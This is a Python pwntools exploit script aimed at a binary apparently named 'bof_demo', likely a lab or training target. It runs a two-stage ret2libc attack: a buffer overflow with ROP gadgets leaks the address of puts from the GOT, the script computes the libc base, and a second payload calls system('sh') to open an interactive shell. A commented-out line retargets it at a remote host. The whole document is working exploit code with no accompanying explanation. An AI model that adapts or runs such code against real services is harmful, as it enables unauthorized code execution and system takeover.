#!/usr/bin/env python
from pwn import *

# Gadgets
pop_rdi = 0x401273  # pop rdi ; ret
pop_rsi = 0x401271  # pop rsi ; pop r15 ; ret
ret = 0x40101a      # ret

puts_plts = 0x401070    # objdump -d bof_demo | grep -i puts
puts_got  = 0x404018    # readelf -a ./bof_demo | grep -i puts

sh = 0x4004af # 0x73747570006873 ('sh')
main = 0x4010b0 # objdump -d bof_demo | grep -i main

binary = ELF('./bof_demo') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
context.log_level = 'error'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_offset = libc.symbols['puts']

# 1st Stage Payload
payload = b"\x90"*208
payload += b"JUNKJUNK"
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plts)
payload += p64(ret)
payload += p64(main)

# Start program
p = process("./bof_demo")
#p = remote("<your remote IP>",443)   # Uncomment this to exploit the binary remotely
p.recvuntil(b"> ")

# Send 1st Stage Payload
p.sendline(payload)

p.recvuntil(b"JUNKJUNK")
p.recv(4)

# Receive leak libc
puts_libc = u64(p.recv(6).ljust(8,b'\x00'))
print("puts_libc",hex(puts_libc))

# Time to do some Math
libc_base = puts_libc - puts_offset
print("libc_base",hex(libc_base))

# Calculate libc address
system_addr = libc_base + libc.symbols['system']
sh_addr = libc_base + next(libc.search(b"sh\0"))
print("system_address",hex(system_addr))

# 2nd stage payload
payload2 = b"\x90"*208
payload2 += b"JUNKJUNK"
payload2 += p64(pop_rdi)
payload2 += p64(sh_addr)
payload2 += p64(system_addr)

p.recvuntil(b"> ")

# Send 2nd stage payload
p.sendline(payload2)
p.recvuntil(b"\n")

# Receive shell
p.interactive()
